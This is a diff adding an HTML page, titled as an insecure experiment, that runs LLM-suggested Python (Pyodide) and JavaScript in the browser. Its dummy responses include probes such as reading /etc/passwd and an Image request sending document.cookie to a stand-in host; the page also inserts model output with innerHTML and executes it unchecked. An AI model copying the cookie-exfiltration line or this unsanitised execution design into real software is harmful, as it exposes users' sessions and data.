@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Insecure Slop: tests towards running untrusted code?</title>
+  <script src="https://cdn.jsdelivr.net/pyodide/v0.23.2/full/pyodide.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-grow: 1;
+      gap: 20px;
+    }
+
+    .editor-section,
+    .chat-section {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .tabs {
+      display: flex;
+    }
+
+    .tab {
+      padding: 10px 20px;
+      cursor: pointer;
+      border: 1px solid #ccc;
+      border-bottom: none;
+      background: #f1f1f1;
+    }
+
+    .tab.active {
+      background: white;
+    }
+
+    textarea {
+      width: 100%;
+      height: 200px;
+      resize: vertical;
+      font-family: monospace;
+    }
+
+    #chatArea {
+      flex-grow: 1;
+      overflow-y: auto;
+      border: 1px solid #ccc;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+
+    #inputArea {
+      display: flex;
+    }
+
+    #userInput {
+      flex-grow: 1;
+      padding: 5px;
+    }
+
+    button {
+      padding: 5px 10px;
+      margin-top: 10px;
+    }
+
+    #codeOutput {
+      width: 100%;
+      height: 100px;
+      background-color: #f0f0f0;
+      border: 1px solid #ccc;
+      padding: 10px;
+      margin-top: 10px;
+      overflow-y: auto;
+      font-family: monospace;
+      white-space: pre-wrap;
+    }
+
+    .user-message {
+      color: blue;
+    }
+
+    .llm-message {
+      color: green;
+    }
+
+    .code-block {
+      background-color: #f0f0f0;
+      padding: 10px;
+      margin: 5px 0;
+      border-radius: 5px;
+    }
+
+    .run-code-btn {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 14px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="editor-section">
+      <div class="tabs">
+        <div class="tab active" onclick="switchTab('python')">Python</div>
+        <div class="tab" onclick="switchTab('javascript')">JavaScript</div>
+      </div>
+      <textarea id="pythonEditor" style="display:block;">
+import math
+
+def calculate_circle_area(radius):
+    return math.pi * radius ** 2
+
+radius = 5
+area = calculate_circle_area(radius)
+print(f"The area of a circle with radius {radius} is approximately {area:.2f}")
+            </textarea>
+      <textarea id="javascriptEditor" style="display:none;">
+function calculateCircleArea(radius) {
+    return Math.PI * radius ** 2;
+}
+
+const radius = 5;
+const area = calculateCircleArea(radius);
+console.log(`The area of a circle with radius ${radius} is approximately ${area.toFixed(2)}`);
+            </textarea>
+      <button onclick="runEditorCode()">Run Code</button>
+    </div>
+    <div class="chat-section">
+      <div id="chatArea"></div>
+      <div id="inputArea">
+        <input type="text" id="userInput" placeholder="Type your message here...">
+        <button onclick="sendMessage()">Send</button>
+      </div>
+    </div>
+  </div>
+  <div id="codeOutput"></div>
+
+  <script>
+    let pyodide;
+    let currentTab = 'python';
+    const chatArea = document.getElementById('chatArea');
+    const userInput = document.getElementById('userInput');
+    const codeOutput = document.getElementById('codeOutput');
+    async function main() {
+      try {
+        pyodide = await loadPyodide();
+        console.log('Pyodide loaded. Ready to run code.');
+        // Set up custom print and console.log
+        pyodide.runPython(`
+                import sys
+                from js import console
+
+                class CustomOutput:
+                    def write(self, text):
+                        console.log(text.rstrip())
+                    def flush(self):
+                        pass
+
+                sys.stdout = CustomOutput()
+                sys.stderr = CustomOutput()
+            `);
+      } catch (error) {
+        console.error('Error initializing Pyodide:', error);
+        alert('Failed to initialize Pyodide. Some features may not work.');
+      }
+    }
+
+    function switchTab(tab) {
+      document.getElementById('pythonEditor').style.display = tab === 'python' ? 'block' : 'none';
+      document.getElementById('javascriptEditor').style.display = tab === 'javascript' ? 'block' : 'none';
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      event.target.classList.add('active');
+      currentTab = tab;
+    }
+    async function runEditorCode() {
+      const code = document.getElementById(currentTab + 'Editor').value;
+      await runCode(currentTab === 'python' ? 'py' : 'js', code);
+    }
+    async function sendMessage() {
+      const message = userInput.value.trim();
+      if (message) {
+        appendMessage('user', message);
+        userInput.value = '';
+        const response = await getLLMResponse(message);
+        appendMessage('llm', response);
+      }
+    }
+    async function getLLMResponse(message) {
+      try {
+        const response = await fetch('http://localhost:7678/v1/chat/completions', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            model: "local-model",
+            messages: [{
+              role: "user",
+              content: message
+            }],
+            max_tokens: 500
+          }),
+        });
+        const data = await response.json();
+        return data.choices[0].message.content;
+      } catch (error) {
+        console.warn('Error fetching LLM response, using dummy LLM:', error);
+        return getDummyLLMResponse();
+      }
+    }
+
+    function getDummyLLMResponse() {
+      const responses = [
+        "Here's a Python code to calculate the factorial: <code2run lang=\"py\">\ndef factorial(n):\n    return 1 if n == 0 else n * factorial(n-1)\n\nprint(factorial(5))\n</code2run>",
+        "Let's try some JavaScript: <code2run lang=\"js\">\nfunction fibonacci(n) {\n    return n <= 1 ? n : fibonacci(n-1) + fibonacci(n-2);\n}\nconsole.log(fibonacci(10));\n</code2run>",
+        "How about we generate a random number? <code2run lang=\"py\">\nimport random\nprint(random.randint(1, 100))\n</code2run>",
+        "Here's a simple JavaScript array operation: <code2run lang=\"js\">\nconst numbers = [1, 2, 3, 4, 5];\nconst doubled = numbers.map(n => n * 2);\nconsole.log(doubled);\n</code2run>",
+        "Let's try to access some system information: <code2run lang=\"py\">\nimport platform\nprint(f\"OS: {platform.system()}\")\nprint(f\"Machine: {platform.machine()}\")\nprint(f\"Processor: {platform.processor()}\")\n</code2run>",
+        "Here's a JavaScript code that attempts to make a network request: <code2run lang=\"js\">\nfetch('https://api.example.com/data')\n  .then(response => response.json())\n  .then(data => console.log(data))\n  .catch(error => console.error('Error:', error));\n</code2run>",
+        "This Python code attempts to read a file: <code2run lang=\"py\">\ntry:\n    with open('/etc/passwd', 'r') as file:\n        print(file.read())\nexcept Exception as e:\n    print(f\"Error: {e}\")\n</code2run>",
+        "Here's a JavaScript code that tries to access browser storage: <code2run lang=\"js\">\nif (typeof localStorage !== 'undefined') {\n    localStorage.setItem('sensitiveData', 'test123');\n    console.log(localStorage.getItem('sensitiveData'));\n} else {\n    console.log('localStorage is not available');\n}\n</code2run>",
+        "This Python code attempts to import a potentially dangerous module: <code2run lang=\"py\">\ntry:\n    import subprocess\n    result = subprocess.run(['ls', '-l'], capture_output=True, text=True)\n    print(result.stdout)\nexcept Exception as e:\n    print(f\"Error: {e}\")\n</code2run>",
+        "Here's a JavaScript code that attempts to make a DNS lookup: <code2run lang=\"js\">\nconst dnsLookup = new Image();\ndnsLookup.src = `http://malicious-lookup.ad.example.net/${encodeURIComponent(document.cookie)}`;\nconsole.log('Attempted DNS lookup');\n</code2run>"
+      ];
+      return responses[Math.floor(Math.random() * responses.length)];
+    }
+
+    function appendMessage(role, content) {
+      const messageDiv = document.createElement('div');
+      messageDiv.className = role === 'user' ? 'user-message' : 'llm-message';
+      messageDiv.innerHTML = formatMessage(content);
+      chatArea.appendChild(messageDiv);
+      chatArea.scrollTop = chatArea.scrollHeight;
+    }
+
+    function formatMessage(message) {
+      // Replace code blocks with styled divs and add a run button
+      return message.replace(/<code2run lang="(py|js)">([\s\S]*?)<\/code2run>/g,
+        (match, lang, code) => `
+                <div class="code-block">
+                    ${lang.toUpperCase()} Code:<br>${code}<br>
+                    <button class="run-code-btn" onclick="runCode('${lang}', \`${code.replace(/`/g, '\\`')}\`)">Run Code</button>
+                </div>
+            `
+      );
+    }
+    async function runCode(lang, code) {
+      codeOutput.textContent = 'Running code...';
+      try {
+        let result;
+        if (lang === 'py') {
+          result = await pyodide.runPythonAsync(code);
+          codeOutput.textContent = 'Python code executed successfully. Check the browser console for output.';
+        } else if (lang === 'js') {
+          // Create a new function to execute the JavaScript code
+          const execFunc = new Function('console', `
+                    let output = '';
+                    const originalLog = console.log;
+                    console.log = (...args) => {
+                        output += args.join(' ') + '\\n';
+                        originalLog.apply(console, args);
+                    };
+                    
+                    try {
+                        ${code}
+                    } catch (error) {
+                        output += 'Error: ' + error.message;
+                    }
+                    
+                    console.log = originalLog;
+                    return output;
+                `);
+          // Execute the JavaScript code
+          result = execFunc(console);
+          codeOutput.textContent = 'JavaScript code executed. Output:\n' + result;
+        }
+      } catch (error) {
+        codeOutput.textContent = `Error executing code: ${error.message}`;
+      }
+    }
+    // Initialize Pyodide
+    main();
+    // Allow sending messages with Enter key
+    userInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        sendMessage();
+      }
+    });
+  </script>
+</body>
+
+</html>
